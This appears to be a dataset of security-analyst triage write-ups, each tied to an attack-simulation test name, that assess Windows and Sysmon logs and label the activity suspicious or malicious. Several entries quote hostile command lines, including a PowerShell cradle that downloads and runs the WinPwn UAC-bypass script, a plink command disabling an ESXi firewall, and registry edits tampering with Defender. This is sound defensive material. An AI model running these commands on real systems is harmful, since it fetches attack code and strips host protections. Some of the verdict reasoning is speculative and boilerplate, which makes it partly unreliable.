Disable Windows Prefetch Through Registry,"### Analysis of Windows Event Logs

#### System Log Analysis
- **Event ID 24 and 1** from `Microsoft-Windows-Kernel-General`: Records indicate changes in system time (ExitReason of ""0"" and Reason of ""1""). These events are relatively normal, often due to network time synchronization, as also seen with connection to `time.windows.com`. No suspicious behavior detected.
- **Event ID 35** from `Microsoft-Windows-Time-Service`: This relates to the selection of a time source. It’s a standard NTP time-sync event with `time.windows.com` and is expected behavior in typical Windows operations.

#### Sysmon Log Analysis
- **Events with Image Paths of `cmd.exe`, `wevtutil.exe`, `conhost.exe`, and `reg.exe`**: The presence of so many processes like `cmd.exe` and `reg.exe` being invoked, especially for registry modification by `admin_test`, can be a red flag. The specific command executed through `cmd.exe` aims to modify system settings to disable the prefetcher (`/d 0`), a typical tactic used for performance alteration by attackers or misconfigured settings.
- The execution of `conhost.exe`, `wevtutil.exe`, and repeated invocations in short succession could suggest scripted automation or attempts to clean or modify event logs.
- **Events involving `HOSTNAME.EXE` and `whoami.exe`**: These tools are run, likely indicative of a user enacting or scripting for network operations or persistence checks.
- **The involvement of a particular user `SERVER002\\admin_test`**: This centralized pattern of activity from this user profile — performing actions that touch sysadmin-level changes — is unusual and could suggest either authorized administrative tasks, misconfiguration, or potential unauthorized access.

#### Security Log Analysis
- **Event ID 4616 from `Microsoft-Windows-Security-Auditing`**: Reflects changes in system time. This matches the behavior seen in the System log, indicating it correlates to standard NTP time-sync activities.

### Assessment and Resolution
#### Overall Assessment:
The activity in the logs points to certain behaviors that warrant concern:
- Frequent use of command-line tools (`cmd.exe`, `whoami.exe`, `HOSTNAME.EXE`) and registry edits (`reg.exe`) could imply scripted operations, possibly unauthorized system changes.
- Consistent entries with `admin_test` suggest that this user account is engaged in numerous potentially sensitive operations.
- While these activities can be symptomatic of administrative tasks in certain contexts, without direct evidence or audit trail confirming such authorization, such behaviors remain suspicious.

#### Identified Threats and Risks:
- Potential misuse of administrative privileges via the `admin_test` account.
- Registry edits that could alter system performance and behavior, indicating possible configuration issues or preparatory steps by an attacker.

#### Guidance on How to Proceed:
- Further investigation is required into the role and actions of the `admin_test` user account, verifying whether these tasks align with user responsibilities or scripts known to IT operations or security teams.
- Review access logs and permissions related to `admin_test` to determine if any unauthorized accesses occurred.
- Investigate and if necessary, roll back the registry modifications affecting system prefetching settings if this change was not intentionally planned.
- Conduct an audit of the network time settings and ensure they align with the company’s standard configuration policies.

### Resolution:
**SUSPICIOUS** - The activity observed in the logs suggests patterns and behaviors that are unexpected and contain elements typically associated with potential unauthorized access or misconfiguration. Further detailed review and investigation are warranted to ascertain the true nature of these activities."
Rundll32 syssetup.dll Execution,"Based on the provided sequence of Sysmon event logs, the following analysis and assessment are drawn:

### Analysis of the Logs:

1. **Powershell Execution**:
   - **Event ID 5**: Indicates that `powershell.exe` process was initiated by the `SERVER002\admin_test` user. While PowerShell usage is common for administrators, without context or command-line arguments, its execution can be suspicious given the potential for use in attacks, especially with no corresponding legitimate administrative tasks mentioned.

2. **Conhost and Wevtutil Usage**:
   - Frequent alternating instances of `conhost.exe` and `wevtutil.exe` initiated by `SERVER002\admin_test`. 
   - `wevtutil.exe` is a legitimate Windows command-line utility for reading event logs but frequent usage might suggest attempts to tamper with or clear logs, which is often conducted to cover tracks after malicious activities.

3. **Process Chain Including cmd.exe and Rundll32**:
   - **Event ID 1**: The use of `cmd.exe` with a command line invoking `rundll32.exe` to execute a `.inf` setup file from the Temp directory is anomalous and potentially malicious. 
   - The directory path, `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.011\src\`, and usage of `rundll32.exe` with `syssetup.dll` are particularly concerning as they imply actions beyond typical administrative operations, possibly related to malware execution or persistence mechanisms.

4. **Classical Reconnaissance Tools**:
   - Execution of `whoami.exe` and `hostname.exe` suggests reconnaissance activities to retrieve local machine and user information, aligning with techniques employed during the reconnaissance or post-exploitation stages of a cyber attack.

### Assessment of the Situation:
- **Indicators of Compromise**:
  - The unusual frequency of `wevtutil.exe` and `conhost.exe` processes could indicate an attempt to tamper with or cover up event logs.
  - Use of `rundll32.exe` with a setup `.inf` file in a non-standard path is a strong indicator of potentially malicious activity aimed at executing or installing unauthorized software/code.
  - Execution of `cmd.exe` with complex commands referencing setup actions from the Temp directory is suspicious and not typical of routine legitimate operations; this warrants further investigation.

### Final Assessment:
- Given the sequence of events and their context, this pattern leads to a classification closer to potential malicious activity, particularly due to the suspicious use of system utilities and command execution sequences.
  
### Resolution:
- **MALICIOUS**: The activity within these logs is indicative of unauthorized actions and potential malicious intent based on command-line executions that strongly suggest a compromise or unauthorized maneuver, possibly for malware execution or persistence.

### Recommendation for Follow-up Actions:
1. **Immediate Isolation**: If possible, isolate `Server002` from the network to prevent any potential spread of malicious activity.
2. **In-depth Log Review**: Perform a comprehensive review of detailed logs, focusing on concurrent administrative access logs, and command history to identify the source or actor responsible.
3. **File System Analysis**: Check for unknown or suspicious files in temporary and user-accessible folders.
4. **Endpoint Security**: Run a detailed antivirus/antimalware scan on the system and consider employing EDR (Endpoint Detection and Response) solutions for better visibility into potential threats.
5. **Audit Administrative Actions**: Evaluate if `SERVER002\admin_test` corresponds to normal user behavior, or if there are irregularities in action timing or frequency involving elevated permissions.
6. **Incident Report**: Document findings and escalate to the incident response team for further forensic investigation and remediation."
Modify UseTPMKeyPIN Registry entry,"Based on the logs provided, let's analyze the events for any indicators of suspicious or malicious activity:

1. **Security Log**:
   - We see EventID 4616, which indicates a time change event, executed by the LOCAL SERVICE account via ""svchost.exe."" While time changes can sometimes be used by malware to try to persist or obfuscate activities, time adjustments performed by system services are not inherently suspicious. There does not appear to be any direct evidence of malicious activity in the time change events alone. 
   
2. **Application Log**:
   - The ""edgeupdate"" service stoppage and Software Protection Platform (SPP) events are recorded. These types of events are relatively benign as stopping or starting of update services is routine, especially for software like browsers. There are no indicators of malicious activities based solely on these events.

3. **System Log**:
   - Several Kernel-General events related to time changes again, which mirror the security log observations and don't, by themselves, indicate malicious activity. 
   - The Time-Service event choosing a time source is typical and benign behavior.

4. **Sysmon Log**:
   - A notable entry includes the execution of `cmd.exe` with the command line: `reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMKeyPIN /t REG_DWORD /d 2 /f`. This command modifies the registry to enforce the usage of a TPM Key PIN, which could be legitimate or part of a configuration change.
   - Another potential point of interest is the frequent execution of `wevtutil.exe` and `conhost.exe` by a user named `admin_test`. While `wevtutil` can be used to clear logs—a technique used by attackers—there is no indication of logs being cleared or other misuse in the immediate events shown.
   - Multiple executions of Microsoft Edge Update are seen, which are expected for software updates.
   - Processes running under ""NT AUTHORITY\SYSTEM"" are common for system-level services and updates; however, details suggest standard update processes.

5. **General Observations**:
   - No obvious signs of privilege escalation or malicious payload execution are detected directly from the logs.
   - The activity involving registry changes via command line could be suspicious but would require additional context to determine intent (legitimate administrative operations vs. the start of malicious configuration).
   - Usage of tools like `cmd.exe`, `reg.exe`, and potential PowerShell execution (although not shown in logs) often warrant further examination, especially for unauthorized changes.

### Conclusion
Based on the data provided:

- The activity observed, particularly the command line registry modification, might not align with typical user operations unless explained by administrative tasks.
- We lack concrete malicious indicators but have some events that might require further inspection to rule out possible misuse.

### Resolution
- **SUSPICIOUS**: The logs contain activities, such as direct registry modifications via cmd.exe, that don't look right and warrant further investigation. Further inquiry should involve looking into the origin and authorization for the command-line registry edits, possibly reviewing for related orchestration changes or automations and verifying with administrators.
"
MSBuild Bypass Using Inline Tasks (VB),"### Detailed Analysis

#### Sysmon Logs
1. **PowerShell Execution:**
   - `powershell.exe` execution by `SERVER002\admin_test`. 
   - Powershell is a common tool for attackers to perform reconnaissance or execute payloads, especially if executed with elevated privileges.

2. **Wevtutil.exe and Conhost.exe:**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` are executed.
   - `wevtutil.exe` is a legitimate utility to manage event logs, but it is often used by attackers to delete those logs to cover their tracks.
   - `conhost.exe` is generally used by console applications. Its presence here aligns with standard event processing, but its repetitive pairing with `wevtutil.exe` raises suspicion.

3. **HostName and WhoAmI:**
   - Instances of `HOSTNAME.EXE` and `whoami.exe` are executed, which might indicate scrutiny of the system information and user account by the same user (`SERVER002\admin_test`).

4. **Cmd.exe with msbuild.exe:**
   - Execution of `cmd.exe` invoking `msbuild.exe` with a script from a temporary location.
   - `msbuild.exe` can be leveraged for file execution as part of “Living off the Land” tactics where system-native tools are used maliciously.
   - The use of `cmd.exe` to invoke `msbuild.exe` with a temporary script indicates possible execution of potential code or scripts with intent unknown—this is suspicious.

#### Security Logs
- There are typical logon events with the `Advapi` logon process, indicating system or service-level activities.
- Privilege escalation (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.) are recorded. While this can be standard for certain service operations, it could also be an indicator of process tampering.

#### Application Logs
- Regular operations related to system and application-level services, but two events show that the Edge Update service was stopped, which aligns with the normal update or service cessation processes.

### Assessment
#### Threats and Risks Identified:
- **Suspicious process activity:** The execution of `PowerShell`, `wevtutil.exe`, and `msbuild.exe` in quick succession and from non-standard directories is suspect and typical for obfuscation, reconnaissance, or malicious execution attempts.
- **Potential Log Deletion:** Use of `wevtutil.exe` indicates a potential attempt to clear event logs.
- **Use of `msbuild.exe`:** Suggests an attempt to sideload or execute scripts undetected by conventional anti-malware tools.

### Guidance on How to Proceed:
1. **Further Investigation:**
   - Analyze the command-line arguments of the `PowerShell` and `msbuild.exe` processes to understand their intent.
   - Inspect changes or deletions in event logs corresponding to the time period in question.
   - Analyze file hashes and cross-reference them with threat intelligence databases to determine if any of the binaries are flagged malicious.
2. **Endpoint Monitoring:**
   - Increase monitoring on `SERVER002` for unusual activities, especially user activities under `admin_test`.
   - Implement stricter control and logging of PowerShell and similar utilities' usage.

### Resolution
Given the suspicious behavior, particularly the process executions and use of native Windows tools in potentially obfuscated ways, the logs are assessed as:

**SUSPICIOUS**

Further investigation is warranted to conclusively determine if malicious activity occurred."
Disable Windows Shutdown Button,"Based on my analysis of the provided Windows event logs, the following observations have been made:

1. **Suspicious Time Manipulation**: 
   - Multiple security logs (Event ID 4616) show changes in system time with the process `svchost.exe`. Time manipulation is a known tactic used by attackers to erase tracks or extend active session period.
   
2. **Privileged Account Activity**:
   - A user with the name ""admin_test"" has been associated with high privilege actions and executed multiple processes with elevated privileges (Event ID 4672). The use of highly privileged tokens such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege` points toward potential unauthorized control or system-level access attempts.

3. **Process Execution**:
   - In the Sysmon logs, multiple process executions are seen in a short time such as `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `cmd.exe` under the user ""SERVER002\\admin_test"". This pattern of spawning system binaries is usually indicative of a script or batch file execution.
   - The execution of `cmd.exe` with a command line involving registry modification (`reg add...`) is often suspicious, especially since it modifies policies which are generally sensitive configurations.

4. **Command Line Arguments**:
   - The `cmd.exe` process executed a command to alter the registry key for shutdown behavior using the `REG ADD ... /f` command, often a tactic used to modify or disable security features, suggesting malicious intent.

5. **Services Behavior**:
   - Several legitimate system services are executed, such as `wbem\\WmiPrvSE.exe`, `sppsvc.exe`, `TrustedInstaller.exe`, `MicrosoftEdgeUpdate.exe`, under `NT AUTHORITY\\SYSTEM`. While they seem benign on the surface, they may coincide with malicious processes to mask activities.

### Assessment:
- The logs contain activities that are suspicious in nature, with evidence of potential misuse of privileged access, time manipulation, and unauthorized registry modifications. The combination of these activities warrants deeper investigation.

### Resolution:
- **SUSPICIOUS**: The event logs suggest activity that doesn't look right and warrants further investigation, particularly the use of elevated privileges and unauthorized registry changes. It is recommended to further investigate the ""admin_test"" account, checking for any signs of unauthorized access or control. Additionally, verify whether the registry changes and time manipulation align with known changes or authorized actions.

Proceed with the systematic investigation of:
- Origin of the `admin_test` account and its activity history.
- Any external connections or unauthorized logins.
- Validation of registry changes against organization policy.
- Thorough inspection of time sync settings or logs for irregularities."
Enable Proxy Settings,"Upon analyzing the provided Windows event logs, here's a detailed breakdown:

### 1. **Security Log Analysis**
- **Event IDs 4616**: Indicates a time change event, which is generally benign if it's from a legitimate source. The time change is handled by `svchost.exe` under `LOCAL SERVICE`, and there's no indication of abnormal privileges or actions, suggesting benign time sync activity.

### 2. **Sysmon Log Analysis**
- **Process Executions**:
  - **`wevtutil.exe` and `conhost.exe`**: Multiple executions by `SERVER002\admin_test`. Wevtutil is a utility that can query and back up event logs, which can be suspicious if executed frequently or without known administrative activity. The absence of a specific command argues against initial malicious intent, but repetitive logging without context needs monitoring for possible misuse.
  
  - **`cmd.exe` followed by `reg.exe`**: Cmd executed a registry modification to enable a proxy (`HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings`). This is concerning because such changes can impact system networking settings and may indicate an attempt to redirect traffic through a proxy for data exfiltration or other malicious activities.

  - **`whoami.exe`, `conhost.exe`**: Execution appears associated with administrative testing or routine scripting. Execution of `whoami` for querying logged-in user status is typically benign unless part of a sequence of reconnaissance by an attacker.

  - **Microsoft Edge Update** (`MicrosoftEdgeUpdate.exe`): Executed under `NT AUTHORITY\SYSTEM`, indicating it performed an update or check which is typical, especially if not unusually timed or repeated abnormally. 

### 3. **Application Log Analysis**
- **Software Protection Platform Service**: Log entry with Event ID 16384 logs benign software licensing activities. This does not indicate compromise.

### 4. **System Log Analysis**
- These entries align with time synchronization (`TimeService`, `Kernel-General`) and are typical for system operation. 

### **Assessment**
Core areas of concern arise from:
- **Registry Modification via cmd**: `cmd.exe` executing a command to change system proxy settings is a high-risk indicator. This action is often leveraged by malware or intruders to intercept or redirect network traffic.
- **frequent usage of `wevtutil.exe` by admin account**: Though needing context, could be benign if related to routine scripts or log management; otherwise, unauthorized log tampering could be in question.

### **Resolution**
Classify the findings as **SUSPICIOUS** – there is a significant event (proxy registry modification) that could be part of malicious activity needing thorough investigation to rule out exploitation or unauthorized access. This involves verifying if the responsible actions were legitimate administrative tasks or signs of command-line misuse. For this:
- Verify manual or automated scripts run by `SERVER002\admin_test`.
- Conduct a thorough review of related network anomalies or alerts.
- Review organizational change logs or approvals around the timestamp of the events.

**Next Steps**
- Contact and interview the user `admin_test` or system administrator for clarification on their actions.
- Monitor further events involving similar command executions.
- Assess potential need for enhanced monitoring or incident response protocols if additional suspicious indicators are uncovered.

It is imperative to ascertain whether the registry change was authorized and ensure no further unauthorized configurations are made."
WinPwn - UAC Magic,"Upon analyzing the provided Windows event logs, we observe several notable activities:

1. **PowerShell Logs**:
   - A series of PowerShell processes with the command line: `powershell.exe & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') UACBypass -noninteractive -command ""C:\windows\system32\cmd.exe"" -technique magic}`.
   - Downloading and executing scripts from GitHub repositories can be an indicator of potential malicious activity, especially if it involves bypassing User Account Control (UAC) as indicated by `UACBypass -noninteractive`.

2. **Security Logs**:
   - The logs show a user `admin_test` gaining several high privileges through the event ID 4672, including `SeDebugPrivilege`, which allows a user to debug and potentially manipulate system processes. This can be used maliciously to escalate privileges or alter system behavior.
   - There are multiple instances of user `admin_test` logging in from an IP address `192.168.0.102` using NTLM authentication, which is somewhat standard; however, its connection with the previous PowerShell activity is concerning.

3. **Sysmon Logs**:
   - The creation of multiple instances of PowerShell, conhost, and process executions such as `wevtutil.exe` and `whoami.exe` by the user `SERVER002\admin_test` suggest automated or script-based activities.
   - A suspicious PowerShell command is again evident in the current directory `C:\Users\ADMIN_~1\AppData\Local\Temp\`, which corroborates the PowerShell log findings.

4. **Additional Context**:
   - The use of `wevtutil.exe` could be related to querying or modifying event logs, possibly to cover tracks often associated with malicious behavior.
   - `sppsvc.exe` and other normal system processes like `TiWorker.exe` and `TrustedInstaller.exe` are observed, which are typical for Windows but provide background on overall system activity.

**Summary**:
The combination of downloading and executing scripts from the internet using PowerShell with UAC bypass techniques, coupled with high-privilege assignments to an administrative user and a sequence of execution of other utilities, points towards suspicious activity leaning towards potential system compromise.

**Resolution**: **MALICIOUS**

**Guidance**:
- Immediately isolate the system to prevent further potential compromise.
- Investigate the user `admin_test` for any unauthorized actions or deviations from typical behavior patterns.
- Perform a comprehensive threat hunt for persistence mechanisms and mitigate any identified breaches.
- Review and potentially enhance security controls and monitoring for PowerShell execution and privilege escalations within the network."
Delete TeamViewer Log Files,"Upon analyzing the provided logs from the given Windows machine, several points need to be assessed to determine whether there are any indicators of malicious activity or compromise.

### 1. **PowerShell Logs:**
- **Unusual Command Usage:** The PowerShell logs show the execution of a script with the command: `powershell.exe & {New-Item -Path $env:TEMP\\TeamViewer_54.log -Force | Out-Null, Remove-Item $env:TEMP\\TeamViewer_54.log -Force -ErrorAction Ignore}`. Although creating and deleting a file in the temporary directory is not inherently malicious, it could indicate attempts to execute a script or leave less trace of activities, especially if the naming resembles known legitimate software like ""TeamViewer"".
  
### 2. **System Logs:**
- **Time Changes:** The logs show multiple instances of time adjustments by `svchost.exe` in close intervals, which could indicate an attempt to evade detection by altering timestamps. However, time synchronization of system clocks is a legitimate system activity, often attributed to the system's time service.

### 3. **Security Logs:**
- No direct suspicious activity was detected. The entries primarily capture legitimate system processes performing expected actions.

### 4. **Application Logs:**
- The logs mention a service stop related to an ""edgeupdate"", which appears to be a legitimate update process for Microsoft Edge.

### 5. **Sysmon Logs:**
- **Frequent Use of `wevtutil.exe`:** We see multiple uses of the `wevtutil.exe` utility by the user `SERVER002\admin_test`. This could potentially indicate log clearing activity or changes to event logging on the system unless used for legitimate purposes like log exporting or analysis.
- **Multiple Use of Administrative Commands:** There is usage of administrative commands like `whoami.exe`, which can be used to gather system information potentially for reconnaissance or privilege identification.
- **PowerShell Activity:** The PowerShell command matches those seen in the dedicated PowerShell logs, reinforcing the need to scrutinize the context under which these commands are run.
- **Microsoft Edge Update Activity:** The recent installation and registration tasks are normal processes associated with Microsoft's update infrastructure.

### Assessment and Conclusion:
Based on the analysis of the logs:
- The **PowerShell** activity, while possibly indicative of an attempt to obfuscate actions, does not firmly confirm malicious intent in isolation.
- The **use of `wevtutil.exe`** is typical of suspicious behavior if connected with administrative or unauthorized log access, especially when paired with administrative queries like `whoami.exe`.
- **System time synchronization and logs** do not show overtly suspicious behavior but could warrant further monitoring if tied with malicious sequence detection.

### Resolution:
Given the specifics combined across different logs, the activity can be characterized as:

**SUSPICIOUS**

Further investigation is warranted to determine the legitimacy of the PowerShell activity and `wevtutil.exe` processes. It is recommended to:
- Review user activity logs corresponding to `SERVER002\admin_test` for legitimacy.
- Check known good baselines or established protocols regarding the names and timings of PowerShell activity.
- Investigate any additional context or alerts that could correlate these activities with broader system behavior.

Conduct a thorough check of administrative access logs and confirm lower-level changes in configurations or permissions on the system."
Abusing MyComputer Disk Backup Path for Persistence,"Upon reviewing the provided Windows event logs, several observations can be made regarding the recorded activities from the Sysmon, Application, Security, and System logs:

### Anomalous and Suspicious Behavior

1. **Sysmon Events:**
   - The execution of `cmd.exe` with the command to add a registry key to point `BackupPath` to `notepad.exe` is suspicious. This action can be indicative of a persistence mechanism by attackers where benign executables are replaced or pointed to malicious ones (`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\BackupPath`).
   - Commands that manipulate registry keys without clear administrative intent or approval can often be seen in malicious activity aimed at persistence or privilege escalation.
   - The processes `wevtutil.exe` and `conhost.exe` show multiple executions, which typically assist in the handling or reporting of events and do not directly indicate malicious actions. However, these could be used in a living-off-the-land technique if involved within a larger attack chain. Careful attention and examination are warranted, especially coupled with other suspicious behavior.

2. **Security Events:**
   - Event ID 4616 indicates a security auditing event that corresponds with a time change by `LOCAL SERVICE` and is tied to `svchost.exe`. While time syncing is standard for domain-joined systems, time changes can be abused to evade detections reliant on accurate timestamps during an attack.
   - The time shift is only by a few seconds, suggesting potential adjustments rather than evasion attempts, but oddities here should trigger verification.

3. **Application and System Logs:**
   - The `edgeupdate` services messages do not indicate malicious activity, just a service stop, corresponding likely to normal operations.
   - Multiple execution entries for Microsoft Edge Update in various forms (services, setups) under `NT AUTHORITY\SYSTEM` seem regular for update processes, but should be cross-verified for scheduled update activities.
   - The `sppsvc.exe`, `TiWorker.exe`, `TrustedInstaller.exe` legitimate system processes, executed under system or network services, suggest normal update and service handling operations without clear indicators of compromise.

### Assessment and Resolution

Based on the log analysis:

- The activity involving `cmd.exe` and registry manipulation is distinctly suspicious. Such activities typically warrant a deeper inspection into intent, user behavior at the time of events, and any associated files/processes.
- The execution patterns and processes linked to `Microsoft Edge Update` are frequent but aligned with typical system update behavior.
- Other processes and activities seem benign regarding direct malicious indicators, such as standard services and audit operations.

### Recommendation & Conclusion

Considering the details above:
- **Resolution: SUSPICIOUS** - Direct signs of malicious intent are not absolute, but the registry modification through command-line processes necessitates further investigation. Verify the legitimacy of user actions, review corresponding network activity, and ensure system integrity, checking for any unauthorized persistence mechanisms.
- Conduct a threat hunt involving user activity surrounding registry changes and validate the legitimacy of involved executables.
- Review security configurations to minimize privilege use wherever possible and detect similar unusual registry operations proactively.

Please address false positives by validating user actions and monitor for any new anomalies that may arise in context with these logs."
Delete Microsoft Defender ASR Rules - GPO,"Upon analyzing the provided Windows event logs, several activities were noted which require careful analysis to determine the benignity, suspicion, or maliciousness of actions on the Windows host.

### 1. Time Synchronization
We observe multiple log entries related to time synchronization, as indicated by EventID 4616 and 1. These indicate that the system time was adjusted slightly, which could be a normal system activity for time correction using a time server. No anomalies or specific indicators suggest manipulation related to malicious activity here.

### 2. Process Execution and Command-line Activities
Significant entries in the Sysmon logs show execution of commonly misused Windows utilities like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and most notably, `powershell.exe`.

- **Svchost.exe**: Continuously seen in various events running under `NT AUTHORITY\SYSTEM` and `NT AUTHORITY\LOCAL SERVICE`, typical behavior for legitimate Windows processes managing general services.
  
- **wevtutil.exe and conhost.exe**: Both seen executed several times by the user `SERVER002\admin_test`. The use of `wevtutil.exe` (Windows Event Utility) can have legitimate uses but could also be cleaning event logs post-exploitation restoration to cover tracks. This warrants further investigation.

- **Whoami.exe and Hostname.exe**: These commands are generally benign, used to check the current user details and hostname, possibly as part of a script or manual reconnaissance.

- **PowerShell Activity**: The most concerning activities arise from PowerShell, particularly seen in the Sysmon log and Windows PowerShell log entries. A PowerShell script modifies the Windows Defender Exploit Guard registry settings temporarily (""Registry key created"" followed by ""Registry value deleted""). This behavior is atypical and is often used in various types of attacks to evade or disable security features.

### 3. PowerShell Logs
Entries indicate the execution of PowerShell scripts that manipulate registry keys related to Windows Defender's Exploit Guard. This type of activity is suspicious, suggesting a potential attempt to change security settings, which are then reverted, hence trying to avoid detection or maintain stealth.

### Conclusion
Based on the logs provided, there are indicators of potentially suspicious activity, particularly the PowerShell script modifying registry settings and repeated execution of `wevtutil.exe`. Though these actions themselves may not be conclusively malicious as standalone execution, they strongly suggest suspicious intent and behavior that require further detailed forensic analysis.

**Resolution: SUSPICIOUS**

### Guidance:
- Further investigate the PowerShell script's origins, associated files, and script contents.
- Review any additional contexts from user `SERVER002\admin_test` activities around the same time.
- Assess if the registry changes had any intended or side effects.
- Examine the system's event logs and any deviations that could provide insight into potential tampering.
- Collect and analyze network traffic logs to detect any outbound communications that could suggest compromised system behavior.
  
An immediate deep dive into these logs is encouraged to ensure there are no ongoing security breaches."
Tamper with Windows Defender Registry - Powershell,"Based on the provided event logs from the Windows host, a thorough examination reveals the following:

### Suspicious Activity Noticed:

1. **PowerShell Activity**:
   - Numerous PowerShell commands were executed that explicitly disabled Windows Defender features, including AntiSpyWare, AntiVirus, Real-Time Protection monitoring, and Tamper Protection. The command also attempts to modify registry keys to reduce the system's defenses, which is a clear indication of potentially malicious activity aiming to weaken the security posture of the host.
   - PowerShell is a powerful scripting tool in Windows environments, and these kinds of commands are often associated with malware or adversaries attempting to maintain persistence or cover their tracks.

2. **Sysmon Logs**:
   - A series of `wevtutil.exe` executions are observed, which is commonly used for managing Windows Event Logs. The command is executed by the user `SERVER002\admin_test`. This can be used to clear logs, possibly to hide tracks if part of malicious activity.
   - Following `wevtutil.exe`, several `conhost.exe` processes are executed, likely to provide command execution through a console window host. While not inherently malicious, in conjunction with other logs, it deserves further attention.
   - The execution of `HOSTNAME.EXE`, `whoami.exe`, and `conhost.exe` under the context of the administrator with high integrity levels is typical administrative behavior but suspicious considering the context of aggressive security disablement.

3. **Edge Update Activity**:
   - Multiple entries related to `MicrosoftEdgeUpdate.exe`, however, appear benign as they show standard updating processes that align with legitimate update mechanisms of Microsoft Edge. They are executed under the SYSTEM account, further suggesting the behavior is expected for system updates.

### Threat Assessment:

The aggressive disabling of multiple Windows Defender features via PowerShell strongly suggests malicious intent. This is a significant indicator of compromise, especially when combined with executions of event utility commands which might be used for erasing evidence of these activities.

### Conclusion:
Given the evidence of attempts to disable security features, the execution of potentially security-evasive utility programs, and the nature of these actions aligning with common patterns seen in compromised systems, the logs suggest that this host may have been compromised.

### Resolution:
- **Resolution: MALICIOUS**

### Recommended Actions:
1. **Isolate the Host**: Immediately isolate the affected host from the network to prevent any potential spread of malicious activity.
   
2. **Conduct a Full Forensics Analysis**: Capture a memory dump and other relevant forensics artifacts from the host for further analysis to better understand the nature and impact of the compromise.
   
3. **Restore from Backup**: Consider restoring the host from a clean, known-good backup if possible.
   
4. **Strengthen Security Policies**: Review and strengthen endpoint security policies and monitoring practices to detect and prevent similar occurrences in the future.

5. **User Education**: Ensure that users are aware of security practices, particularly around the use of admin accounts and the execution of powerful scripts like PowerShell."
ESXi - Disable Firewall via Esxcli,"Based on the provided Windows event logs, here's a detailed analysis and assessment:

### Analysis:

1. **PowerShell Execution**:
    - There are several instances of `powershell.exe` being executed by the user `SERVER002\admin_test`. 
    - PowerShell is a common tool used for both legitimate administrative tasks and malicious activities. Without additional context or specific command-line arguments, it's not inherently suspicious, but should be further checked.

2. **Wevtutil Execution**:
    - The `wevtutil.exe` tool, which is used for managing event logs, is executed multiple times. While this can be a part of normal administrative routines, it may also indicate attempts to tamper with logs or gather information about system events.

3. **Hostname and Whoami Executions**:
    - `hostname.exe` and `whoami.exe` are executed, indicating attempts to gather system and user information. This behavior could be part of legitimate scripts or initial reconnaissance by an attacker.

4. **CMD Execution with Plink**:
    - One log entry stands out: the execution of `cmd.exe` with a command-line argument indicating the use of `plink.exe` (part of the PuTTY suite) to connect to an SSH server and execute a script (`esxi_disable_firewall.txt`).
    - The executed command: `""cmd.exe"" /c C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\plink.exe -ssh file.local -l root -pw n/a -m C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\files\\data.004\\src\\esxi_disable_firewall.txt` suggests potential unauthorized or malicious activity, such as disabling firewalls on an ESXi host.

5. **EdgeUpdate Activities**:
    - Multiple instances of `MicrosoftEdgeUpdate.exe` running various updates and services are observed. This seems typical for keeping software up to date and does not directly suggest malicious activity.

### Assessment:

Based on the presence of `plink.exe` used to connect to a remote SSH server and execute a potentially malicious script to change firewall settings, this behavior is highly suspicious and indicative of potential malicious activity. The lack of clarity around the legitimate need for these actions further compounds this impression.

### Resolution:

**MALICIOUS** - The detected use of `plink.exe` to remotely connect and modify firewall settings is highly indicative of unauthorized or malicious actions that require immediate intervention.

### Guidance:

1. **Immediate Actions**:
    - Isolate the affected machine (`Server002`) from the network to prevent further potential unauthorized access.
    - Review and possibly disable the account `SERVER002\admin_test` and reset credentials.
    - Perform a forensic analysis to determine the origin and extent of the breach.

2. **Further Investigation**:
    - Verify the contents of the scripts executed via `plink.exe` and evaluate any other changes made to systems remotely.
    - Check firewall logs and settings on the referenced ESXi host for unexpected configurations or connections.
    - Audit PowerShell and other administrative tool usage to discern legitimate actions from potential threats.

3. **Preventative Measures**:
    - Enhance monitoring of command-line activities, especially for known administrative and potentially dual-use tools.
    - Educate staff on secure usage of remote connection tools and enforce stricter access controls.

This situation indicates a potential breach and necessitates swift and comprehensive action."
Msiexec.exe - Execute Local MSI file with an embedded EXE,"Upon reviewing the provided Windows event logs from Sysmon and the Application log, here's the analysis:

1. **Sysmon Log Analysis**:
   - **Potentially Suspicious Activity**:
     - Several processes were executed by the user `SERVER002\admin_test` in quick succession. The primary processes include:
       - `powershell.exe`, which could be benign or malicious depending on the executed script. However, no command-line argument is visible, so further context is required.
       - `wevtutil.exe` and `conhost.exe` were repeatedly executed. While these are standard system processes, their repetitive execution in quick succession is unusual without context.
       - `cmd.exe` was used to execute `msiexec.exe` to install a `.msi` file located under a temporary user directory, which is a common location for execution of potentially unwanted programs.
       - The command line argument used with `cmd.exe` contains `/q` for quiet installation, typical for stealthy malware installation.
       - `msiexec.exe` was used to run an installer (`data.007_EXE.msi`) from a temporary directory. The installation being quiet and from a temporary directory is often associated with malware installations.
       - `HOSTNAME.EXE`, `whoami.exe`, and `cmd.exe` were executed by `wsmprovhost.exe`, a component of Windows Remote Management, which could indicate remote activities on this system.
       - Execution of binary (`MSIA30E.tmp`) with no description or company information can often be a red flag for malicious activities or at least warrant further investigation.
   - **Benign Activity**:
     - Processes related to Microsoft Edge updates were detected (`MicrosoftEdge_X64_130.0.2849.56_129.0.2792.89.exe`, `setup.exe`). These are common during automatic updates of the Edge browser if legit.

2. **Application Log Analysis**:
   - **MsiInstaller Events**:
     - The event `11707` indicates the installation of a product named ""file file Test Installer"", which is reported as an installation completed successfully. However, the generic naming can often imply a testing binary or potentially unwanted software.
   - **Other Events**:
     - Logs from `MsiInstaller` and `RestartManager` events align with the observed installation activities in Sysmon logs related to the `msiexec.exe` command.

3. **Assessment**:
   - There are several signs pointing towards suspicious behavior, especially the installation of a `.msi` file located in a temporary directory executed using a quiet mode which is atypical for regular installations but common in malicious activities.
